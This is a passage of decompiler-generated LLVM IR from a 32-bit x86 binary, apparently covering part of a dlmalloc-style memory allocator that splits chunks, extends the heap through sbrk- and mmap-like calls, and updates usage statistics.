  store i32 %v3_805384e, i32* %v2_8053830, align 4
  %v0_805385d = load i32, i32* %ebx.global-to-local, align 4
  %v1_805385d = load i32, i32* %eax.global-to-local, align 4
  %v2_805385d = add i32 %v1_805385d, 8
  %v3_805385d = inttoptr i32 %v2_805385d to i32*
  store i32 %v0_805385d, i32* %v3_805385d, align 4
  %v0_8053860 = load i32, i32* %esi.global-to-local, align 4
  %tmp127 = icmp ult i32 %v0_8053860, 16
  br i1 %tmp127, label %dec_label_pc_8053865, label %dec_label_pc_805386c

dec_label_pc_8053865:                             ; preds = %dec_label_pc_805384b
  %v0_8053865 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8053865 = load i32, i32* @edx, align 4
  %v2_8053865 = add i32 %v0_8053865, 4
  %v3_8053865 = add i32 %v2_8053865, %v1_8053865
  %v4_8053865 = inttoptr i32 %v3_8053865 to i32*
  %v5_8053865 = load i32, i32* %v4_8053865, align 4
  %v6_8053865 = or i32 %v5_8053865, 1
  store i32 %v6_8053865, i32* %v4_8053865, align 4
  br label %dec_label_pc_80538ab

dec_label_pc_805386c:                             ; preds = %dec_label_pc_805384b
  store i32 %v1_8053948, i32* %eax.global-to-local, align 4
  %v0_8053875 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8053875 = add i32 %v0_8053875, %v1_8053948
  store i32 %v2_8053875, i32* @edx, align 4
  %v1_8053878 = load i32, i32* @ebp, align 4
  %v2_8053878 = add i32 %v1_8053878, 8
  %v3_8053878 = inttoptr i32 %v2_8053878 to i32*
  store i32 %v2_8053875, i32* %v3_8053878, align 4
  %v0_805387b = load i32, i32* @edx, align 4
  %v1_805387b = load i32, i32* @ebp, align 4
  %v2_805387b = add i32 %v1_805387b, 12
  %v3_805387b = inttoptr i32 %v2_805387b to i32*
  store i32 %v0_805387b, i32* %v3_805387b, align 4
  %v0_805387e = load i32, i32* @edx, align 4
  %v1_805387e = add i32 %v0_805387e, 8
  %v2_805387e = inttoptr i32 %v1_805387e to i32*
  store i32 ptrtoint (i32* @global_var_80575b4.209 to i32), i32* %v2_805387e, align 4
  %v0_8053885 = load i32, i32* @edx, align 4
  %v1_8053885 = add i32 %v0_8053885, 12
  %v2_8053885 = inttoptr i32 %v1_8053885 to i32*
  store i32 ptrtoint (i32* @global_var_80575b4.209 to i32), i32* %v2_8053885, align 4
  br i1 %v6_8053601, label %dec_label_pc_8053894, label %dec_label_pc_805388e

dec_label_pc_805388e:                             ; preds = %dec_label_pc_805386c
  %v0_805388e = load i32, i32* @edx, align 4
  store i32 %v0_805388e, i32* @global_var_80575b0.208, align 16
  br label %dec_label_pc_8053894

dec_label_pc_8053894:                             ; preds = %dec_label_pc_805386c, %dec_label_pc_805388e
  %v4_8053894 = or i32 %v1_8053948, 1
  %v0_8053899 = load i32, i32* %esi.global-to-local, align 4
  store i32 %v4_8053894, i32* %ebx.global-to-local, align 4
  %v1_805389f = or i32 %v0_8053899, 1
  store i32 %v1_805389f, i32* %eax.global-to-local, align 4
  %v1_80538a2 = load i32, i32* %ecx.global-to-local, align 4
  %v2_80538a2 = add i32 %v1_80538a2, 4
  %v3_80538a2 = inttoptr i32 %v2_80538a2 to i32*
  store i32 %v4_8053894, i32* %v3_80538a2, align 4
  %v0_80538a5 = load i32, i32* %esi.global-to-local, align 4
  %v1_80538a5 = load i32, i32* @edx, align 4
  %v3_80538a5 = add i32 %v1_80538a5, %v0_80538a5
  %v4_80538a5 = inttoptr i32 %v3_80538a5 to i32*
  store i32 %v0_80538a5, i32* %v4_80538a5, align 4
  %v0_80538a8 = load i32, i32* %eax.global-to-local, align 4
  %v1_80538a8 = load i32, i32* @edx, align 4
  %v2_80538a8 = add i32 %v1_80538a8, 4
  %v3_80538a8 = inttoptr i32 %v2_80538a8 to i32*
  store i32 %v0_80538a8, i32* %v3_80538a8, align 4
  br label %dec_label_pc_80538ab

dec_label_pc_80538ab:                             ; preds = %dec_label_pc_8053865, %dec_label_pc_8053894
  %v0_80538ab = load i32, i32* %ecx.global-to-local, align 4
  %v1_80538ab = add i32 %v0_80538ab, 8
  store i32 %v1_80538ab, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8053cad

dec_label_pc_80538b3.loopexit:                    ; preds = %dec_label_pc_8053800
  br label %dec_label_pc_80538b3

dec_label_pc_80538b3:                             ; preds = %dec_label_pc_80538b3.loopexit, %dec_label_pc_80535bb, %dec_label_pc_80535c3
  %v0_80538b3 = load i32, i32* @global_var_80575ac.207, align 4
  store i32 %v0_80538b3, i32* @ebx, align 4
  %v1_80538bd = add i32 %v1_8053948, 16
  store i32 %v1_80538bd, i32* @esi, align 4
  %v1_80538c0 = add i32 %v0_80538b3, 4
  %v2_80538c0 = inttoptr i32 %v1_80538c0 to i32*
  %v3_80538c0 = load i32, i32* %v2_80538c0, align 4
  %v1_80538c7 = and i32 %v3_80538c0, -4
  store i32 %v1_80538c7, i32* %ecx.global-to-local, align 4
  %v7_80538ca = icmp ult i32 %v1_80538c7, %v1_80538bd
  br i1 %v7_80538ca, label %dec_label_pc_80538ea, label %dec_label_pc_80538ce

dec_label_pc_80538ce:                             ; preds = %dec_label_pc_80538b3
  %v2_80538d2 = add i32 %v0_80538b3, %v1_8053948
  store i32 %v2_80538d2, i32* @edx, align 4
  %v1_80538d5 = or i32 %v1_8053948, 1
  store i32 %v1_80538d5, i32* %eax.global-to-local, align 4
  store i32 %v2_80538d2, i32* @global_var_80575ac.207, align 4
  store i32 %v1_80538d5, i32* %v2_80538c0, align 4
  %v0_80538e1 = load i32, i32* %ecx.global-to-local, align 4
  %v5_80538e1 = sub i32 %v0_80538e1, %v1_8053948
  store i32 %v5_80538e1, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8053c3d

dec_label_pc_80538ea:                             ; preds = %dec_label_pc_80538b3
  %v0_80538ea = load i32, i32* @global_var_80578dc.212, align 4
  store i32 %v0_80538ea, i32* %edx.global-to-local, align 4
  %v0_80538f0 = load i8, i8* @global_var_8057580.206, align 128
  %v1_80538f0 = and i8 %v0_80538f0, 2
  %v2_80538f0 = icmp eq i8 %v1_80538f0, 0
  br i1 %v2_80538f0, label %dec_label_pc_805391e, label %dec_label_pc_80538f9

dec_label_pc_80538f9:                             ; preds = %dec_label_pc_80538ea
  store i32 ptrtoint (i8* @global_var_8057580.206 to i32), i32* %stack_var_-92, align 4
  %v2_8053901 = call i32 @function_8054171(i32* bitcast (i8* @global_var_8057580.206 to i32*))
  store i32 ptrtoint (i8* @global_var_8057580.206 to i32), i32* @ebx, align 4
  %v1_805390b = add i32 %v1_8053948, -7
  store i32 %v1_805390b, i32* %eax.global-to-local, align 4
  store i32 %v1_805390b, i32* %stack_var_-92, align 4
  %v1_805390f = call i32 @function_8053554(i32 %v1_805390b)
  store i32 %v1_805390f, i32* %eax.global-to-local, align 4
  store i32 %v1_805390f, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8053cad

dec_label_pc_805391e:                             ; preds = %dec_label_pc_80538ea
  %v1_805391e = add i32 %v0_80538ea, -1
  store i32 %v1_805391e, i32* @ecx, align 4
  store i32 %v1_8053948, i32* @ebx, align 4
  %v1_8053929 = load i32, i32* @global_var_80578cc.213, align 4
  %v7_8053929 = icmp ult i32 %v1_8053948, %v1_8053929
  br i1 %v7_8053929, label %dec_label_pc_80539eb, label %dec_label_pc_8053935

dec_label_pc_8053935:                             ; preds = %dec_label_pc_805391e
  %v0_8053935 = load i32, i32* @global_var_80578d0.214, align 16
  store i32 %v0_8053935, i32* %eax.global-to-local, align 4
  %v1_805393a = load i32, i32* @global_var_80578d4.215, align 4
  %v5_8053940 = icmp slt i32 %v0_8053935, %v1_805393a
  br i1 %v5_8053940, label %dec_label_pc_8053946, label %dec_label_pc_80539eb

dec_label_pc_8053946:                             ; preds = %dec_label_pc_8053935
  %v2_8053948 = add i32 %v1_8053948, 10
  %v3_8053948 = add i32 %v2_8053948, %v0_80538ea
  %v1_805394c = sub i32 0, %v0_80538ea
  store i32 %v1_805394c, i32* %eax.global-to-local, align 4
  %v2_805394e = and i32 %v3_8053948, %v1_805394c
  store i32 %v2_805394e, i32* @ebx, align 4
  %tmp128 = icmp ugt i32 %v2_805394e, %v1_8053948
  br i1 %tmp128, label %dec_label_pc_805395a, label %dec_label_pc_80539eb

dec_label_pc_805395a:                             ; preds = %dec_label_pc_8053946
  store i32 0, i32* %stack_var_-92, align 4
  %v8_8053967 = call i32 @function_8054d98(i32 0, i32 %v2_805394e, i32 3, i32 34, i32 0, i32 0, i32 %v1_805391e, i32 %v1_805391e)
  store i32 %v8_8053967, i32* %eax.global-to-local, align 4
  store i32 %v8_8053967, i32* @edx, align 4
  %v10_8053971 = icmp eq i32 %v8_8053967, -1
  br i1 %v10_8053971, label %dec_label_pc_805395a.dec_label_pc_80539eb_crit_edge, label %dec_label_pc_8053976

dec_label_pc_805395a.dec_label_pc_80539eb_crit_edge: ; preds = %dec_label_pc_805395a
  %v0_80539eb.pre = load i32, i32* @global_var_80575ac.207, align 4
  br label %dec_label_pc_80539eb

dec_label_pc_8053976:                             ; preds = %dec_label_pc_805395a
  %v1_8053978 = urem i32 %v8_8053967, 8
  %v2_8053978 = icmp eq i32 %v1_8053978, 0
  store i32 %v1_8053978, i32* %ecx.global-to-local, align 4
  br i1 %v2_8053978, label %dec_label_pc_8053990, label %dec_label_pc_805397d

dec_label_pc_805397d:                             ; preds = %dec_label_pc_8053976
  %v0_8053982 = load i32, i32* @ebx, align 4
  %v2_8053984 = sub nsw i32 8, %v1_8053978
  store i32 %v2_8053984, i32* %eax.global-to-local, align 4
  %v2_8053986 = add i32 %v2_8053984, %v8_8053967
  store i32 %v2_8053986, i32* @edx, align 4
  %v2_8053988 = sub i32 %v0_8053982, %v2_8053984
  store i32 %v2_8053988, i32* %esi.global-to-local, align 4
  %v2_805398a = inttoptr i32 %v2_8053986 to i32*
  store i32 %v2_8053984, i32* %v2_805398a, align 4
  br label %dec_label_pc_8053998

dec_label_pc_8053990:                             ; preds = %dec_label_pc_8053976
  %v1_8053990 = inttoptr i32 %v8_8053967 to i32*
  store i32 0, i32* %v1_8053990, align 4
  br label %dec_label_pc_8053998

dec_label_pc_8053998:                             ; preds = %dec_label_pc_805397d, %dec_label_pc_8053990
  %storemerge.in = phi i32* [ @esi, %dec_label_pc_805397d ], [ @ebx, %dec_label_pc_8053990 ]
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v1_8053998 = or i32 %storemerge, 2
  %v1_805399b = load i32, i32* @edx, align 4
  %v2_805399b = add i32 %v1_805399b, 4
  %v3_805399b = inttoptr i32 %v2_805399b to i32*
  store i32 %v1_8053998, i32* %v3_805399b, align 4
  %v0_805399e = load i32, i32* @global_var_80578d0.214, align 16
  %v1_80539a3 = add i32 %v0_805399e, 1
  store i32 %v1_80539a3, i32* %eax.global-to-local, align 4
  store i32 %v1_80539a3, i32* @global_var_80578d0.214, align 16
  %v1_80539a9 = load i32, i32* @global_var_80578d8.216, align 8
  %v7_80539af = icmp sgt i32 %v1_80539a3, %v1_80539a9
  br i1 %v7_80539af, label %dec_label_pc_80539b1, label %dec_label_pc_80539b6

dec_label_pc_80539b1:                             ; preds = %dec_label_pc_8053998
  store i32 %v1_80539a3, i32* @global_var_80578d8.216, align 8
  br label %dec_label_pc_80539b6

dec_label_pc_80539b6:                             ; preds = %dec_label_pc_8053998, %dec_label_pc_80539b1
  %v0_80539b6 = load i32, i32* @global_var_80578e4.217, align 4
  %v1_80539bb = load i32, i32* @ebx, align 4
  %v2_80539bb = add i32 %v1_80539bb, %v0_80539b6
  store i32 %v2_80539bb, i32* %eax.global-to-local, align 4
  store i32 %v2_80539bb, i32* @global_var_80578e4.217, align 4
  %v1_80539c2 = load i32, i32* @global_var_80578f0.218, align 16
  %tmp129 = icmp ugt i32 %v2_80539bb, %v1_80539c2
  br i1 %tmp129, label %dec_label_pc_80539ca, label %dec_label_pc_80539cf

dec_label_pc_80539ca:                             ; preds = %dec_label_pc_80539b6
  store i32 %v2_80539bb, i32* @global_var_80578f0.218, align 16
  br label %dec_label_pc_80539cf

dec_label_pc_80539cf:                             ; preds = %dec_label_pc_80539b6, %dec_label_pc_80539ca
  %v1_80539cf = load i32, i32* @global_var_80578e8.219, align 8
  %v2_80539cf = add i32 %v1_80539cf, %v2_80539bb
  store i32 %v2_80539cf, i32* %eax.global-to-local, align 4
  %v1_80539d5 = load i32, i32* @global_var_80578f4.220, align 4
  %tmp130 = icmp ugt i32 %v2_80539cf, %v1_80539d5
  br i1 %tmp130, label %dec_label_pc_80539e1, label %dec_label_pc_8053632

dec_label_pc_80539e1:                             ; preds = %dec_label_pc_80539cf
  store i32 %v2_80539cf, i32* @global_var_80578f4.220, align 4
  br label %dec_label_pc_8053632

dec_label_pc_80539eb:                             ; preds = %dec_label_pc_8053946, %dec_label_pc_805395a.dec_label_pc_80539eb_crit_edge, %dec_label_pc_8053935, %dec_label_pc_805391e
  %v0_80539eb = phi i32 [ %v0_80539eb.pre, %dec_label_pc_805395a.dec_label_pc_80539eb_crit_edge ], [ %v0_80538b3, %dec_label_pc_8053935 ], [ %v0_80538b3, %dec_label_pc_8053946 ], [ %v0_80538b3, %dec_label_pc_805391e ]
  store i32 %v0_80539eb, i32* %eax.global-to-local, align 4
  %v1_80539f4 = add i32 %v0_80539eb, 4
  %v2_80539f4 = inttoptr i32 %v1_80539f4 to i32*
  %v3_80539f4 = load i32, i32* %v2_80539f4, align 4
  %v1_80539fe = and i32 %v3_80539f4, -4
  %v2_80539fe = icmp eq i32 %v1_80539fe, 0
  store i32 %v1_80539fe, i32* @ebp, align 4
  %v1_8053a01 = load i32, i32* @global_var_80578c8.221, align 8
  %v2_8053a01 = add i32 %v1_8053a01, %v1_80538bd
  store i32 %v2_8053a01, i32* %eax.global-to-local, align 4
  %v0_8053a07 = load i8, i8* @global_var_80578e0.222, align 32
  %v1_8053a07 = urem i8 %v0_8053a07, 2
  %v2_8053a07 = icmp eq i8 %v1_8053a07, 0
  br i1 %v2_8053a07, label %dec_label_pc_8053a12, label %dec_label_pc_8053a10

dec_label_pc_8053a10:                             ; preds = %dec_label_pc_80539eb
  %v2_8053a10 = sub i32 %v2_8053a01, %v1_80539fe
  store i32 %v2_8053a10, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053a12

dec_label_pc_8053a12:                             ; preds = %dec_label_pc_80539eb, %dec_label_pc_8053a10
  %v0_8053a16 = phi i32 [ %v2_8053a01, %dec_label_pc_80539eb ], [ %v2_8053a10, %dec_label_pc_8053a10 ]
  %v5_8053a16 = add i32 %v0_8053a16, %v1_805391e
  store i32 %v5_8053a16, i32* %eax.global-to-local, align 4
  %v1_8053a1a = sub i32 0, %v0_80538ea
  store i32 %v1_8053a1a, i32* @edx, align 4
  %v2_8053a22 = and i32 %v5_8053a16, %v1_8053a1a
  store i32 %v2_8053a22, i32* @esi, align 4
  %tmp91 = icmp slt i32 %v2_8053a22, 1
  br i1 %tmp91, label %dec_label_pc_8053a3c, label %dec_label_pc_8053a26

dec_label_pc_8053a26:                             ; preds = %dec_label_pc_8053a12
  store i32 %v2_8053a22, i32* %stack_var_-92, align 4
  %v1_8053a2a = call i32 @function_8055249(i32 %v2_8053a22)
  store i32 %v1_8053a2a, i32* %eax.global-to-local, align 4
  store i32 -1, i32* @edx, align 4
  store i32 %v1_8053a2a, i32* @ebx, align 4
  %v10_8053a37 = icmp eq i32 %v1_8053a2a, -1
  %v1_8053a3a = icmp eq i1 %v10_8053a37, false
  br i1 %v1_8053a3a, label %dec_label_pc_8053a92.dec_label_pc_8053a9b_crit_edge, label %dec_label_pc_8053a26.dec_label_pc_8053a3c_crit_edge

dec_label_pc_8053a26.dec_label_pc_8053a3c_crit_edge: ; preds = %dec_label_pc_8053a26
  %v0_8053a3c.pre = load i8, i8* @global_var_80578e0.222, align 32
  br label %dec_label_pc_8053a3c

dec_label_pc_8053a3c:                             ; preds = %dec_label_pc_8053a26.dec_label_pc_8053a3c_crit_edge, %dec_label_pc_8053a12
  %v0_8053a68 = phi i32 [ -1, %dec_label_pc_8053a26.dec_label_pc_8053a3c_crit_edge ], [ %v1_8053a1a, %dec_label_pc_8053a12 ]
  %v0_8053a3c = phi i8 [ %v0_8053a3c.pre, %dec_label_pc_8053a26.dec_label_pc_8053a3c_crit_edge ], [ %v0_8053a07, %dec_label_pc_8053a12 ]
  %v1_8053a3c = urem i8 %v0_8053a3c, 2
  %v2_8053a3c = icmp eq i8 %v1_8053a3c, 0
  br i1 %v2_8053a3c, label %dec_label_pc_8053a3c.dec_label_pc_8053a51_crit_edge, label %dec_label_pc_8053a45

dec_label_pc_8053a3c.dec_label_pc_8053a51_crit_edge: ; preds = %dec_label_pc_8053a3c
  %v0_8053a51.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8053a51

dec_label_pc_8053a45:                             ; preds = %dec_label_pc_8053a3c
  %v2_8053a49 = add i32 %v1_80539fe, %v1_805391e
  store i32 %v2_8053a49, i32* %eax.global-to-local, align 4
  %v0_8053a4b = load i32, i32* @esi, align 4
  %v2_8053a4b = add i32 %v0_8053a4b, %v2_8053a49
  %v5_8053a4d = and i32 %v2_8053a4b, %v1_8053a1a
  store i32 %v5_8053a4d, i32* @esi, align 4
  br label %dec_label_pc_8053a51

dec_label_pc_8053a51:                             ; preds = %dec_label_pc_8053a3c.dec_label_pc_8053a51_crit_edge, %dec_label_pc_8053a45
  %v0_8053a51 = phi i32 [ %v0_8053a51.pre, %dec_label_pc_8053a3c.dec_label_pc_8053a51_crit_edge ], [ %v5_8053a4d, %dec_label_pc_8053a45 ]
  %tmp131 = icmp ult i32 %v0_8053a51, 1048576
  br i1 %tmp131, label %dec_label_pc_8053a59, label %dec_label_pc_8053a5e

dec_label_pc_8053a59:                             ; preds = %dec_label_pc_8053a51
  store i32 1048576, i32* @esi, align 4
  br label %dec_label_pc_8053a5e

dec_label_pc_8053a5e:                             ; preds = %dec_label_pc_8053a51, %dec_label_pc_8053a59
  %v0_8053a72 = phi i32 [ %v0_8053a51, %dec_label_pc_8053a51 ], [ 1048576, %dec_label_pc_8053a59 ]
  %tmp132 = icmp ugt i32 %v0_8053a72, %v1_8053948
  br i1 %tmp132, label %dec_label_pc_8053a68, label %dec_label_pc_8053ca0

dec_label_pc_8053a68:                             ; preds = %dec_label_pc_8053a5e
  store i32 0, i32* %stack_var_-92, align 4
  %v8_8053a75 = call i32 @function_8054d98(i32 0, i32 %v0_8053a72, i32 3, i32 34, i32 0, i32 0, i32 %v0_8053a68, i32 %v0_8053a68)
  store i32 %v8_8053a75, i32* %eax.global-to-local, align 4
  store i32 %v8_8053a75, i32* @ebx, align 4
  %v10_8053a7f = icmp eq i32 %v8_8053a75, -1
  br i1 %v10_8053a7f, label %dec_label_pc_8053ca0, label %dec_label_pc_8053a92.thread

dec_label_pc_8053a92.thread:                      ; preds = %dec_label_pc_8053a68
  %v0_8053a88 = load i8, i8* @global_var_80578e0.222, align 1
  %v2_8053a88 = and i8 %v0_8053a88, -2
  store i8 %v2_8053a88, i8* @global_var_80578e0.222, align 32
  %v1_8053a8f = load i32, i32* @esi, align 4
  %v2_8053a8f = add i32 %v1_8053a8f, %v8_8053a75
  store i32 %v2_8053a8f, i32* @edx, align 4
  br label %dec_label_pc_8053a9b

dec_label_pc_8053a92.dec_label_pc_8053a9b_crit_edge: ; preds = %dec_label_pc_8053a26
  %v1_8053a9f.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8053a9b

dec_label_pc_8053a9b:                             ; preds = %dec_label_pc_8053a92.dec_label_pc_8053a9b_crit_edge, %dec_label_pc_8053a92.thread
  %v1_8053a9f = phi i32 [ %v1_8053a8f, %dec_label_pc_8053a92.thread ], [ %v1_8053a9f.pre, %dec_label_pc_8053a92.dec_label_pc_8053a9b_crit_edge ]
  %v0_8053b6794 = phi i32 [ %v8_8053a75, %dec_label_pc_8053a92.thread ], [ %v1_8053a2a, %dec_label_pc_8053a92.dec_label_pc_8053a9b_crit_edge ]
  %v0_8053b5993 = phi i32 [ %v2_8053a8f, %dec_label_pc_8053a92.thread ], [ -1, %dec_label_pc_8053a92.dec_label_pc_8053a9b_crit_edge ]
  %v0_8053a9f = load i32, i32* @global_var_80578e8.219, align 8
  %v2_8053a9f = add i32 %v1_8053a9f, %v0_8053a9f
  store i32 %v2_8053a9f, i32* @global_var_80578e8.219, align 8
  %v2_8053aa5 = add i32 %v1_80539fe, %v0_80539eb
  store i32 %v2_8053aa5, i32* %ecx.global-to-local, align 4
  %v2_8053aa7 = sub i32 %v0_8053b6794, %v2_8053aa5
  %v7_8053aa7 = icmp ult i32 %v0_8053b6794, %v2_8053aa5
  %v12_8053aa7 = icmp eq i32 %v2_8053aa7, 0
  %v1_8053aa9 = icmp eq i1 %v12_8053aa7, false
  br i1 %v1_8053aa9, label %dec_label_pc_8053ac2, label %dec_label_pc_8053aab

dec_label_pc_8053aab:                             ; preds = %dec_label_pc_8053a9b
  %v10_8053aab = icmp eq i32 %v0_8053b5993, -1
  %v1_8053aae = icmp eq i1 %v10_8053aab, false
  br i1 %v1_8053aae, label %dec_label_pc_8053ac2, label %dec_label_pc_8053ab0

dec_label_pc_8053ab0:                             ; preds = %dec_label_pc_8053aab
  %v2_8053ab0 = add i32 %v1_8053a9f, %v1_80539fe
  store i32 %v0_80539eb, i32* %ecx.global-to-local, align 4
  %v1_8053ab7 = or i32 %v2_8053ab0, 1
  store i32 %v1_8053ab7, i32* %eax.global-to-local, align 4
  store i32 %v1_8053ab7, i32* %v2_80539f4, align 4
  br label %dec_label_pc_8053bef

dec_label_pc_8053ac2:                             ; preds = %dec_label_pc_8053aab, %dec_label_pc_8053a9b
  %v0_8053ac2 = load i8, i8* @global_var_80578e0.222, align 1
  %v1_8053ac2 = sext i8 %v0_8053ac2 to i32
  store i32 %v1_8053ac2, i32* %eax.global-to-local, align 4
  %v2_8053ac7 = urem i8 %v0_8053ac2, 2
  %v3_8053ac7 = icmp eq i8 %v2_8053ac7, 0
  br i1 %v3_8053ac7, label %dec_label_pc_8053adb, label %dec_label_pc_8053acb

dec_label_pc_8053acb:                             ; preds = %dec_label_pc_8053ac2
  br i1 %v2_80539fe, label %dec_label_pc_8053adb, label %dec_label_pc_8053acf

dec_label_pc_8053acf:                             ; preds = %dec_label_pc_8053acb
  %v1_8053ad1 = icmp eq i1 %v7_8053aa7, false
  br i1 %v1_8053ad1, label %dec_label_pc_8053adb, label %dec_label_pc_8053ad3

dec_label_pc_8053ad3:                             ; preds = %dec_label_pc_8053acf
  %v1_8053ad3 = and i32 %v1_8053ac2, -2
  %v4_8053ad3 = trunc i32 %v1_8053ad3 to i8
  store i32 %v1_8053ad3, i32* %eax.global-to-local, align 4
  store i8 %v4_8053ad3, i8* @global_var_80578e0.222, align 32
  br label %dec_label_pc_8053adb

dec_label_pc_8053adb:                             ; preds = %dec_label_pc_8053acf, %dec_label_pc_8053acb, %dec_label_pc_8053ac2, %dec_label_pc_8053ad3
  %v0_8053adb = phi i8 [ %v0_8053ac2, %dec_label_pc_8053acf ], [ %v0_8053ac2, %dec_label_pc_8053acb ], [ %v0_8053ac2, %dec_label_pc_8053ac2 ], [ %v4_8053ad3, %dec_label_pc_8053ad3 ]
  %v1_8053adb = urem i8 %v0_8053adb, 2
  %v2_8053adb = icmp eq i8 %v1_8053adb, 0
  br i1 %v2_8053adb, label %dec_label_pc_8053b59, label %dec_label_pc_8053ae4

dec_label_pc_8053ae4:                             ; preds = %dec_label_pc_8053adb
  br i1 %v2_80539fe, label %dec_label_pc_8053af2, label %dec_label_pc_8053ae8

dec_label_pc_8053ae8:                             ; preds = %dec_label_pc_8053ae4
  store i32 %v2_8053aa7, i32* %eax.global-to-local, align 4
  %v2_8053aec = add i32 %v2_8053a9f, %v2_8053aa7
  store i32 %v2_8053aec, i32* @global_var_80578e8.219, align 8
  br label %dec_label_pc_8053af2

dec_label_pc_8053af2:                             ; preds = %dec_label_pc_8053ae4, %dec_label_pc_8053ae8
  %v1_8053af4 = urem i32 %v0_8053b6794, 8
  %v2_8053af4 = icmp eq i32 %v1_8053af4, 0
  store i32 %v1_8053af4, i32* %edx.global-to-local, align 4
  %v1_8053af7 = icmp eq i1 %v2_8053af4, false
  br i1 %v1_8053af7, label %dec_label_pc_8053aff, label %dec_label_pc_8053af9

dec_label_pc_8053af9:                             ; preds = %dec_label_pc_8053af2
  store i32 %v0_8053b6794, i32* @edi, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053b09

dec_label_pc_8053aff:                             ; preds = %dec_label_pc_8053af2
  %v2_8053b04 = sub nsw i32 8, %v1_8053af4
  store i32 %v2_8053b04, i32* %eax.global-to-local, align 4
  %v2_8053b06 = add i32 %v2_8053b04, %v0_8053b6794
  store i32 %v2_8053b06, i32* @edi, align 4
  br label %dec_label_pc_8053b09

dec_label_pc_8053b09:                             ; preds = %dec_label_pc_8053af9, %dec_label_pc_8053aff
  %v0_8053b0c = phi i32 [ 0, %dec_label_pc_8053af9 ], [ %v2_8053b04, %dec_label_pc_8053aff ]
  %v2_8053b09 = add i32 %v1_8053a9f, %v0_8053b6794
  %v2_8053b0c = add i32 %v0_8053b0c, %v1_80539fe
  store i32 %v2_8053b0c, i32* %ecx.global-to-local, align 4
  %v2_8053b15 = add i32 %v2_8053b0c, %v2_8053b09
  store i32 %v2_8053b15, i32* %edx.global-to-local, align 4
  %v2_8053b1b = add i32 %v2_8053b15, %v1_805391e
  %v5_8053b1e = and i32 %v2_8053b1b, %v1_8053a1a
  %v2_8053b25 = sub i32 %v5_8053b1e, %v2_8053b15
  store i32 %v2_8053b25, i32* %eax.global-to-local, align 4
  %v2_8053b27 = add i32 %v2_8053b25, %v2_8053b0c
  store i32 %v2_8053b27, i32* @esi, align 4
  store i32 %v2_8053b27, i32* %stack_var_-92, align 4
  %v1_8053b2b = call i32 @function_8055249(i32 %v2_8053b27)
  store i32 %v1_8053b2b, i32* %eax.global-to-local, align 4
  store i32 %v1_8053b2b, i32* @edx, align 4
  %v10_8053b35 = icmp eq i32 %v1_8053b2b, -1
  %v1_8053b38 = icmp eq i1 %v10_8053b35, false
  br i1 %v1_8053b38, label %dec_label_pc_8053b48, label %dec_label_pc_8053b3a

dec_label_pc_8053b3a:                             ; preds = %dec_label_pc_8053b09
  store i32 0, i32* %stack_var_-92, align 4
  %v1_8053b3f = call i32 @function_8055249(i32 0)
  store i32 %v1_8053b3f, i32* %eax.global-to-local, align 4
  store i32 %v1_8053b3f, i32* @edx, align 4
  br label %dec_label_pc_8053b7c

dec_label_pc_8053b48:                             ; preds = %dec_label_pc_8053b09
  %v1_8053b48 = load i32, i32* @ebx, align 4
  %v7_8053b48 = icmp ult i32 %v1_8053b2b, %v1_8053b48
  %v1_8053b4a = icmp eq i1 %v7_8053b48, false
  br i1 %v1_8053b4a, label %dec_label_pc_8053b81, label %dec_label_pc_8053b4c

dec_label_pc_8053b4c:                             ; preds = %dec_label_pc_8053b48
  %v0_8053b4c = load i8, i8* @global_var_80578e0.222, align 1
  %v2_8053b4c = and i8 %v0_8053b4c, -2
  store i8 %v2_8053b4c, i8* @global_var_80578e0.222, align 32
  store i32 %v2_8053b09, i32* @edx, align 4
  br label %dec_label_pc_8053b60

dec_label_pc_8053b59:                             ; preds = %dec_label_pc_8053adb
  %v10_8053b59 = icmp eq i32 %v0_8053b5993, -1
  br i1 %v10_8053b59, label %dec_label_pc_8053b64, label %dec_label_pc_8053b5e

dec_label_pc_8053b5e:                             ; preds = %dec_label_pc_8053b59
  store i32 %v0_8053b6794, i32* @edi, align 4
  br label %dec_label_pc_8053b60

dec_label_pc_8053b60:                             ; preds = %dec_label_pc_8053b4c, %dec_label_pc_8053b5e
  %v0_8053b8158 = phi i32 [ %v2_8053b09, %dec_label_pc_8053b4c ], [ %v0_8053b5993, %dec_label_pc_8053b5e ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_8053b81

dec_label_pc_8053b64:                             ; preds = %dec_label_pc_8053b59
  store i32 %v0_8053b6794, i32* @edi, align 4
  store i32 0, i32* %stack_var_-92, align 4
  %v1_8053b6b = call i32 @function_8055249(i32 0)
  store i32 %v1_8053b6b, i32* @edx, align 4
  %v1_8053b72 = load i32, i32* @ebx, align 4
  %v2_8053b72 = sub i32 %v1_8053b6b, %v1_8053b72
  %v1_8053b74 = load i32, i32* @esi, align 4
  %v2_8053b74 = sub i32 %v2_8053b72, %v1_8053b74
  store i32 %v2_8053b74, i32* %eax.global-to-local, align 4
  %v0_8053b76 = load i32, i32* @global_var_80578e8.219, align 8
  %v2_8053b76 = add i32 %v0_8053b76, %v2_8053b74
  store i32 %v2_8053b76, i32* @global_var_80578e8.219, align 8
  br label %dec_label_pc_8053b7c

dec_label_pc_8053b7c:                             ; preds = %dec_label_pc_8053b3a, %dec_label_pc_8053b64
  %v0_8053b8157 = phi i32 [ %v1_8053b3f, %dec_label_pc_8053b3a ], [ %v1_8053b6b, %dec_label_pc_8053b64 ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_8053b81

dec_label_pc_8053b81:                             ; preds = %dec_label_pc_8053b48, %dec_label_pc_8053b60, %dec_label_pc_8053b7c
  %v0_8053b86 = phi i32 [ %v1_8053b2b, %dec_label_pc_8053b48 ], [ %v0_8053b8158, %dec_label_pc_8053b60 ], [ %v0_8053b8157, %dec_label_pc_8053b7c ]
  %v10_8053b81 = icmp eq i32 %v0_8053b86, -1
  br i1 %v10_8053b81, label %dec_label_pc_8053bef, label %dec_label_pc_8053b86

dec_label_pc_8053b86:                             ; preds = %dec_label_pc_8053b81
  %v1_8053b86 = load i32, i32* @edi, align 4
